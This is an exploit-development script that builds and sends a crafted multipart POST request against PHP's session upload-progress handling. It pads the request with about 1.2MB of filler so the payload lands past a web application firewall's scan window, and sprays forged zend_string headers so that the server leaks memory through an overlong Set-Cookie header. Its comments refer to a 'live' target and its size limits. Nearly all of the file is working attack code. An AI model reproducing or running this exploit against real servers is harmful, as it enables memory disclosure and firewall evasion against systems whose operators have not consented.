#!/usr/bin/env python3
"""LANE-2: build the live map-cover leak B1 (V18h-corrected, WAF-safe shape).

Shape (source-verified cookie laws, V18h):
  [part 'pre'   : filler value            -- pushes the pair past the WAF
                                           scan window (940KB=403, ~1.05MB=pass;
                                           1.2MB filler = margin)]
  [part PHPSESSID : 32-hex sid field      -- NOT the PS(id) setter]
  [part PHP_SESSION_UPLOAD_PROGRESS : 'pwn']
  [part 'f'     : the 0x40-spray value    -- forged zend_string headers
                                           (gc refcount=2, type=6, len=forge)
                                           every 0x40 at offset 0x30]
  NO file part: FILE_START would set PS(id) + send_cookie=0 (the decode path
  = silence). With no file part, MULTIPART_EVENT_END -> rfc1867_cleanup ->
  php_session_initialize -> create path -> send_cookie=1 -> the emission
  reads the forged string = the overlong Set-Cookie.

Budget: ~3.2MB <= 8,388,608B live CL wall (CF de-chunks -> the check applies).
Geometry note: the spray is position-independent -- it covers whatever run
the allocator grants; on the seasoned live pool the grant = the stale sid's
page (map bit free, V17). The pair parts are bin-class allocs (they do not
move the run list), so the late-pair reshuffle does not disturb the cover.

--validate fires ONE plain POST at a target (default the lane2 container)
and reports the Set-Cookie: a fresh 40B cookie = the parse + END-cleanup
create path work (the geometry leak cannot fire on a pristine child -- that
is expected and not a failure of the body).
"""
from __future__ import annotations
import argparse, socket, sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import exp_aa as E
BOUND = E.MULTIPART_BOUNDARY
SID = "e3b0c44298fc1c149afbf4c8996fb924"  # arbitrary; the field is not PS(id)


def part(n: bytes, v: bytes) -> bytes:
    return (b"--" + BOUND + b'\r\nContent-Disposition: form-data; name="'
            + n + b'"\r\n\r\n' + v + b"\r\n")


def build(filler: int, spray: int, forge_len: int) -> bytes:
    v = bytearray(b"A" * spray)
    off = 0x30
    while off + 16 <= len(v):
        v[off:off + 4] = (2).to_bytes(4, "little")       # gc refcount
        v[off + 4:off + 8] = (6).to_bytes(4, "little")   # zend_string type
        v[off + 8:off + 16] = forge_len.to_bytes(8, "little")
        off += 0x40
    body = part(b"pre", b"A" * filler)
    body += part(b"PHPSESSID", SID.encode())
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")
    body += part(b"f", bytes(v))
    body += b"--" + BOUND + b"--\r\n"
    return body


def validate(host: str, port: int, body: bytes, timeout: float = 60.0) -> None:
    hdr = (f"POST /php/index.php HTTP/1.1\r\nHost: {host}:{port}\r\n"
           f"Content-Type: multipart/form-data; boundary={BOUND.decode()}\r\n"
           f"Content-Length: {len(body)}\r\n"
           f"Connection: close\r\n\r\n").encode()
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    s.sendall(hdr + body)
    resp = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            resp += d
            if len(resp) > 1 << 20:
                break
    except OSError:
        pass
    s.close()
    head = resp.split(b"\r\n\r\n", 1)[0]
    cookies = [l for l in head.split(b"\r\n") if b"Set-Cookie" in l]
    print(f"[*] status: {head.split(chr(13).encode() + chr(10).encode(), 1)[0]!r}")
    print(f"[*] Set-Cookie lines: {len(cookies)}")
    for c in cookies:
        print(f"    {c[:120]!r} (len={len(c)})")
    print("[+] fresh 40B cookie = parse + END-cleanup create path OK"
          if cookies and len(cookies[0]) < 100
          else "[!] unexpected cookie shape")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--filler-bytes", type=int, default=1200000)
    ap.add_argument("--spray-bytes", type=int, default=2000000)
    ap.add_argument("--forge-len", type=lambda x: int(x, 0), default=0x1C000)
    ap.add_argument("--out", default="live_b1.bin")
    ap.add_argument("--validate-host", default=None)
    ap.add_argument("--validate-port", type=int, default=8085)
    args = ap.parse_args()

    body = build(args.filler_bytes, args.spray_bytes, args.forge_len)
    Path(args.out).write_bytes(body)
    pair_at = args.filler_bytes + 68  # after the first part's headers+value
    print(f"[+] built {args.out}: {len(body)}B "
          f"(wall 8388608: {'OK' if len(body) <= 8388608 else 'OVER'})")
    print(f"[+] pair position ~{pair_at}B "
          f"(WAF bracket: 940K=403 / ~1.05M=pass -> margin "
          f"{pair_at - 1100000}B past the safe edge)")
    if args.validate_host:
        validate(args.validate_host, args.validate_port, body)
    return 0


if __name__ == "__main__":
    sys.exit(main())
